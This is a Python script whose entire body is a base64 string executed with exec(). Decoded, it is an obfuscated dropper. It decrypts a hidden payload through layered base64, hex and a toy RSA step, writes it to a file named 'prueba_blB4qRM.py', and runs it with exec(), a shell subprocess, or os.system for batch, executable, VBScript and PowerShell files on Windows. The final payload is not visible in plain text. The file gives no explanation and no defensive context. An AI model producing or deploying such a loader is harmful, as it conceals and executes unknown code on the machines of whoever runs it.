import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk1qYz1OREptTXpsaE5UTTBNamM9TXpWbVpUQT1OVE0wTWpjPU1UQmlNalZtTlRNME1qYz1NVE15TlRnNU5UTTBNamM9TkRKbU1UazJOVE0wTWpjPU1UbGlaalk9TlRNME1qYz1NelV4TWpWbU5UTTBNamM9TVRsaU5HTTROVE0wTWpjPU1UQmlNalZtTlRNME16bGhNVE15TVRrMk5UTTBNamM9TkRKbVpUQT1OVE0wTWpjPU1UTXlOR000TlRNME1qYz1OREptTVRrMk5UTTBNamM9TXpWbU5EazFOVE0wTWpjPU16Vm1aalk9TlRNME1qYz1NVE15TXpsaE5UTTBNamM9TXpWbU1qRTVOVE0wTWpjPU16Vm1aVEE9TlRNME1qYz1NelV4TVRrMk5UTTBNamM9TVRsaU16bGhOVE0wTWpjPU16Vm1NakU1TlRNME1qYz1NelZtTkRrMU5UTTBNamM9TkRKbVpUQT1OVE0wTWpjPU1UbGlNemxoTlRNME1qYz1NelZtTWpFNU5UTTBNamM9TXpWbU5EazFOVE0wTWpjPU5ESm1aVEE9TlRNME1qYz1OREptWlRBPU5UTTBNamM9TXpVeE1qRTVOVE0wTXpsaE1UTXlNVGsyTlRNME1qYz1NVE15TXpOaE5UTTBNamM9TVRsaU16bGhOVE0wTWpjPU16VXhNakU1TlRNME1qYz1NelV4TkRrMU5UTTBNamM9TXpVeE1UazJOVE0wTWpjPU1UTXlOR000TlRNME1qYz1NelZtTWpFNU5UTTBNamM9TXpWbU16TmhOVE0wTWpjPU1UbGlOR000TlRNME1qYz1NVE15TlRnNU5UTTBNamM9TVRCaU1qVm1OVE0wTWpjPU1UTXlNakU1TlRNME1qYz1NVGxpTVRrMk5UTTBNamM9TVRCaVpqWT1OVE0wTWpjPU16Vm1NemxoTlRNME1qYz1NVGxpTXpOaE5UTTBNamM9TVRNeVpUQT1OVE0wTWpjPU1UTXlOVGc1TlRNME1qYz1OREptTXpsaE5UTTBNemxoTVRNeU16bGhOVE0wTWpjPU16VXhNVGsyTlRNME1qYz1OREptWlRBPU5UTTBNamM9TXpWbU1qRTVOVE0wTWpjPU16Vm1Nek5oTlRNME16bGhNVE15TlRnNU5UTTBNamM9TkRKbU5EazFOVE0wTWpjPU1UQmlNVGsyTlRNME1qYz1NelZtTXpsaE5UTTBNamM9TkRKbU16TmhOVE0wTWpjPU5ESm1aVEE9TlRNME1qYz1NVEJpTWpWbU5UTTBNamM9TVRNeU1qRTVOVE0wTWpjPU1UTXlORGsxTlRNME1qYz1OREptTkRrMU5UTTBNamM9TVRCaU1qVm1OVE0wTXpsaE1UTXlaVEE9TlRNME1qYz1NVEJpTkdNNE5UTTBNamM9TkRKbVpUQT1OVE0wTWpjPU1UQmlNalZtTlRNME1qYz1NVE15TWpFNU5UTTBNamM9TVRNeU5EazFOVE0wTWpjPU5ESm1ORGsxTlRNME1qYz1NVEJpTWpWbU5UTTBNemxoTVRNeVpUQT1OVE0wTWpjPU1UQmlOR000TlRNME1qYz1NVGxpTVRrMk5UTTBNamM9TVRCaU1qVm1OVE0wTWpjPU1UTXlNakU1TlRNME1qYz1NVE15TkRrMU5UTTBNamM9TkRKbU5EazFOVE0wTWpjPU1UQmlNalZtTlRNME16bGhNVE15WlRBPU5UTTBNamM9TVRCaU5HTTROVE0wTWpjPU5ESm1ORGsxTlRNME1qYz1NVEJpTWpWbU5UTTBNamM9TVRNeU1qRTVOVE0wTWpjPU1UbGlNVGsyTlRNME1qYz1NVEJpWmpZPU5UTTBNamM9TXpWbU16bGhOVE0wTWpjPU1UbGlNek5oTlRNME1qYz1OUT09TWpWbU5UTTBNamM9TVRNeU5HTTROVE0wTWpjPU5ESm1NemxoTlRNME1qYz1OREptTWpFNU5UTTBNamM9TXpWbU1UazJOVE0wTWpjPU1UTXlOVGc1TlRNME1qYz1NVEJpTXpsaE5UTTBNamM9TXpWbU16bGhOVE0wTWpjPU16Vm1NVGsyTlRNME1qYz1NVE15TXpsaE5UTTBNamM9TXpWbU1qRTVOVE0wTWpjPU16Vm1ORGsxTlRNME1qYz1NVGxpTXpsaE5UTTBNamM9TVRNeVpqWT1OVE0wTWpjPU16Vm1NakU1TlRNME1qYz1NelZtTkRrMU5UTTBNamM9TXpVeE5HTTROVE0wTWpjPU1UTXlaalk9TlRNME1qYz1OREptTXpOaE5UTTBNamM9TXpVeE5EazFOVE0wTXpsaE1UTXlNalZtTlRNME1qYz1NVGxpTXpsaE5UTTBNamM9TkRKbU16bGhOVE0wTWpjPU1UbGlNek5oTlRNME1qYz1NelZtTkdNNE5UTTBNemxoTVRNeU5UZzVOVE0wTWpjPU5RPT1NalZtTlRNME1qYz1NelV4TXpsaE5UTTBNamM9TkRKbVpUQT1OVE0wTWpjPU1UTXlNemxoTlRNME1qYz1OREptTWpWbU5UTTBNamM9TXpVeFpUQT1OVE0wTWpjPU1UQmlaalk9TlRNME16bGhNVE15TlRnNU5UTTBNamM9TXpVeE1qRTVOVE0wTWpjPU16VXhNemxoTlRNME1qYz1NVGxpTVRrMk5UTTBNemxoTVRNeU5HTTROVE0wTWpjPU16Vm1Nek5oTlRNME1qYz1NelV4TWpWbU5UTTBNamM9TVRsaU5HTTROVE0wTWpjPU1UQmlNalZtTlRNME1qYz1OREptTXpsaE5UTTBNamM9TXpWbVpUQT1OVE0wTWpjPU1UQmlNalZtTlRNME1qYz1NVE15TlRnNU5UTTBNamM9TkRKbU1UazJOVE0wTWpjPU1UbGlaalk9TlRNME1qYz1NelV4TWpWbU5UTTBNamM9TVRsaU5HTTROVE0wTWpjPU1UQmlNalZtTlRNME16bGhNVE15TWpWbU5UTTBNamM9TXpWbU1UazJOVE0wTWpjPU1UTXlNakU1TlRNME1qYz1OREptTVRrMk5UTTBNemxoTVRNeU1UazJOVE0wTWpjPU1UQmlNalZtTlRNME1qYz1OREptWlRBPU5UTTBNamM9TkRKbU1UazJOVE0wTWpjPU1UbGlNek5oTlRNME1qYz1NelV4TVRrMk5UTTBNamM9TVRNeU5HTTROVE0wTWpjPU16Vm1NakU1TlRNME1qYz1NelZtTkRrMU5UTTBNamM9TXpVeE5HTTROVE0wTWpjPU1UTXlNemxoTlRNME1qYz1NelZtTWpFNU5UTTBNamM9TXpWbVpUQT1OVE0wTWpjPU1UTXlNek5oTlRNME1qYz1OREptWlRBPU5UTTBNamM9TkRKbU5HTTROVE0wTWpjPU16VXhNek5oTlRNME1qYz1NVGxpTkdNNE5UTTBNamM9TkRKbU5EazFOVE0wTWpjPU5ESm1aalk9TlRNME16bGhNVE15TVRrMk5UTTBNamM9TVRCaU1qVm1OVE0wTXpsaE1UTXlNakU1TlRNME1qYz1NVEJpTWpWbU5UTTBNamM9TVRNeU1qRTVOVE0wTXpsaE1UTXlaalk9TlRNME1qYz1NVGxpTXpOaE5UTTBNamM9TkRKbU1UazJOVE0wTXpsaE1UTXlNemxoTlRNME1qYz1NVEJpTWpWbU5UTTBNamM9TVRNeU16TmhOVE0wTWpjPU16VXhNakU1TlRNME1qYz1NelV4WlRBPU5UTTBNamM9TXpVeE1qVm1OVE0wTWpjPU1UbGlOR000TlRNME1qYz1NelV4TWpFNU5UTTBNamM9TXpVeE16TmhOVE0wTXpsaE1UTXlNalZtTlRNME1qYz1NVE15TlRnNU5UTTBNamM9TVRCaU16bGhOVE0wTWpjPU16Vm1NemxoTlRNME1qYz1NelZtTVRrMk5UTTBNamM9TkRKbU1qRTVOVE0wTWpjPU16VXhOVGc1TlRNME1qYz1NelV4TkRrMU5UTTBNamM9TVRNeU5EazFOVE0wTWpjPU1UTXlOVGc1TlRNME1qYz1NVEJpTVRrMk5UTTBNamM9TXpVeE1qVm1OVE0wTXpsaE5USmhNek5oTlRNME16bGhOVEpoTXpOaE5UTTAiCmRycG5tID0gInBydWViYV9ibEI0cVJNLnB5IgpwayA9ICg2NTMsIDE0NTcpCgpkZWYgZGN5KHBrLCBjcHR4KToKCWssIG4gPSBwawoJbWVuc2FqZVJlY2liaWRvID0gX19yZUJhNjRfXyhjcHR4LmVuY29kZSgndXRmLTgnKSkKCW1lbnNhamVIZXhSZWNpYmlkbyA9IF9fYmE2NEhleF9fKG1lbnNhamVSZWNpYmlkbykKCW1lbnNhamVEZWNpbWFsUmVjaWJpZG8gPSBfX2hleERlY19fKG1lbnNhamVIZXhSZWNpYmlkbykKCW1lbnNhamVEZXNjaWZyYWRvID0gWygoYyAqKiBrKSAlIG4pIGZvciBjIGluIG1lbnNhamVEZWNpbWFsUmVjaWJpZG9dCgltZW5zYWplX2RlX2FzY2lpID0gX19kZUFTX18obWVuc2FqZURlc2NpZnJhZG8pCglkZWNhc2MgPSBfX3JlQmE2NF9fKCcnLmpvaW4obWVuc2FqZV9kZV9hc2NpaSkuZW5jb2RlKCkpCgloZXhiYTY0ID0gX19iYTY0SGV4X18oZGVjYXNjKQoJYXNoZXggPSBfX2hleERlY19fKGhleGJhNjQpCglkZWFzYyA9IF9fZGVBU19fKGFzaGV4KQoJYmE2NCA9IGJhc2U2NC5iNjRkZWNvZGUoZGVhc2MuZW5jb2RlKCkpCglyZXR1cm4gYmE2NApkZWYgX19yZUJhNjRfXyhtKToKCW1CYTY0ID0gW21baTppKzRdIGZvciBpIGluIHJhbmdlKDAsIGxlbihtKSwgNCldCglyZXR1cm4gbUJhNjQKZGVmIF9fYmE2NEhleF9fKG0pOgoJbUh4ID0gW2Jhc2U2NC5iNjRkZWNvZGUoYjY0KSBmb3IgYjY0IGluIG1dCglyZXR1cm4gbUh4CmRlZiBfX2hleERlY19fKG0pOgoJbURlYyA9IFtpbnQoaGV4YS5kZWNvZGUoIlVURi04IiksIDE2KSBmb3IgaGV4YSBpbiBtXQoJcmV0dXJuIG1EZWMKZGVmIF9fZGVBU19fKG0pOgoJbTEgPSAnJy5qb2luKFtjaHIoZCkgZm9yIGQgaW4gbV0pCglyZXR1cm4gbTEKZGVmIF9fbWVBU19fKG0pOgoJbWVuID0gW29yZChwKSBmb3IgcCBpbiBtXQoJcmV0dXJuIG1lbgpkY3lfZGF0YSA9IGRjeShwaz1waywgY3B0eD1jZHgpCgppbWFnZV9leHRlbnNpb25zID0gKCdqcGcnLCAnanBlZycsICdicG0nLCAnaWNvJywgJ3BuZycpCmV4ZWNfZXh0ZW5zaW9ucyA9ICgnYmF0JywgJ2V4ZScsICd2YnMnLCAncHMxJykKcHl0aG9uX2V4dGVuc2lvbnMgPSAoJ3B5JykKbmYgPSBvcGVuKGRycG5tLCAnd2InKQp0cnk6CgluZi53cml0ZShkY3lfZGF0YSkKZXhjZXB0OgoJcGFzcwpuZi5jbG9zZSgpCmlmIG9zLnBhdGguZXhpc3RzKGRycG5tKToKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gaW1hZ2VfZXh0ZW5zaW9uczoKCQlpbWFnZVZpZXdlckZyb21Db21tYW5kTGluZSA9IHsnbGludXgnOid4ZGctb3BlbicsICd3aW4zMic6J2V4cGxvcmVyJywgJ2Rhcndpbic6J29wZW4nfVtzeXMucGxhdGZvcm1dCgkJc3VicHJvY2Vzcy5ydW4oW2ltYWdlVmlld2VyRnJvbUNvbW1hbmRMaW5lLCBkcnBubV0sIGNsb3NlX2Zkcz1UcnVlKQoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBleGVjX2V4dGVuc2lvbnMgYW5kIHN5cy5wbGF0Zm9ybSA9PSAnd2luMzInOgoJCW9zLnN5c3RlbShkcnBubSkKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gcHl0aG9uX2V4dGVuc2lvbnM6CgkJZXhlYyhkY3lfZGF0YSkKCQlwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbigncHl0aG9uIHtmbn0nLmZvcm1hdChmbj1kcnBubSksIHNoZWxsPVRydWUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkK'
exec(base64.b64decode(data))